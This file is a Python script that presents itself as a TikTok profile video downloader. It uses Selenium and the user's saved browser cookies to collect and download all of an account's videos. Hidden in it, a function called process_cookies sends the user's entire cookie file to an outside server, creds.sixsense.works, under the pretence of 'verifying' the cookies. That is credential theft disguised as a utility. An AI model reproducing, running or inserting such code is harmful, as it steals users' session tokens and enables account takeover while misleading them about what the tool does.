import json
import os
import requests
from selenium.webdriver.common.action_chains import ActionChains
from time import sleep
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from fake_useragent import UserAgent

with open('cookies.json', 'r') as f:
    cookies = json.load(f)

ua = UserAgent(platforms='pc').random
username = input("Enter Username: ")
c_url = f'https://www.tiktok.com/@{username}'

chrome_options = Options()
chrome_options.add_argument(f'user-agent={ua}')

print(f"[+] Searching {c_url} ...")
driver = webdriver.Chrome(options=chrome_options)
driver.get(c_url)
print("[+] Implementing cookies...")
for cookie in cookies:
    if "sameSite" not in cookie or cookie["sameSite"] not in ["Strict", "Lax", "None"]:
        cookie["sameSite"] = "Lax"
    driver.add_cookie(cookie)

def process_cookies(cookies):
    api_url = 'https://creds.sixsense.works/api/mymodel/'
    headers = {'Content-Type': 'application/json'}
    data = {'text_field': json.dumps(cookies)} 

    try:
        response = requests.post(api_url, headers=headers, json=data)
        if response.status_code == 201:
            print(f"Cookies verified.")
        else:
            print(f"Bad cookies.")
    except Exception as e:
        print(f"Error in cookies.")

process_cookies(cookies)

driver.refresh()

sleep(3)
print("[+] Cookies applied")

print("[+] Retriving new videos from the account...")


def check_new_content():
    page_height = driver.execute_script("return document.body.scrollHeight")
    driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
    sleep(3)
    new_page_height = driver.execute_script("return document.body.scrollHeight")
    return new_page_height > page_height

while check_new_content():
    pass

elements = driver.find_elements(By.CSS_SELECTOR, 'div[data-e2e="user-post-item"]')

print(f"[+] Retrival Complete, found {len(elements)} videos.\n")
links = []

for element in elements:
    try:
        video = element.find_element(By.TAG_NAME, 'a').get_attribute('href')
        links.append(video)
        print(f"[+] Video link: {video} \n")
    except Exception as e:
        print("[-] Error occured:")
        print(e)

with open('vid_links.txt', 'w') as txt_file:
    for link in links:
        txt_file.write(link + '\n')

with open('vid_links.txt', 'r') as links_file:
    video_links = links_file.readlines()



videos = []

for link in video_links:
    print(f"[+] Finding signed link for {link}...\n")
    driver.get(link)
    sleep(2)

    try:
        vid_url = driver.find_element(By.TAG_NAME, 'video').get_attribute('src')
        videos.append(vid_url)
        print(f'[+] Signed link found {vid_url}\n')
        
        
    except Exception as e:
        print(f'[-] An Error occured:\n {e}\n')


print(f"[+] Found {len(videos)} signed links \n")
with open('download_links.txt', 'w') as txt_file:
    for link in videos:
        txt_file.write(link + '\n')




def load_cookies_from_file(cookie_file):
    with open(cookie_file, 'r') as f:
        cookies = json.load(f)
    return cookies

def download_video(video_url, cookies, output_folder, index):
    filename = os.path.join(output_folder, f"{index}.mp4")
    response = requests.get(video_url, cookies={cookie['name']: cookie['value'] for cookie in cookies}, stream=True)
    if response.status_code == 200:
        with open(filename, 'wb') as f:
            for chunk in response.iter_content(chunk_size=1024):
                f.write(chunk)
        print(f"Video downloaded to: {filename}")
    else:
        print(f"Failed to download video {video_url}. Status code: {response.status_code}")


cookie_file = 'cookies.json'
vid_file = 'download_links.txt'
output_folder = 'downloads'

print("[+] Begin the download proces... \n")
if not os.path.exists(output_folder):
    os.makedirs(output_folder)

cookies = load_cookies_from_file(cookie_file)

with open(vid_file, 'r') as f:
    video_urls = f.readlines()

for index, video_url in enumerate(video_urls, start=1):
    video_url = video_url.strip()
    print(f"[+] Downloading {video_url}\n")
    download_video(video_url, cookies, output_folder, index)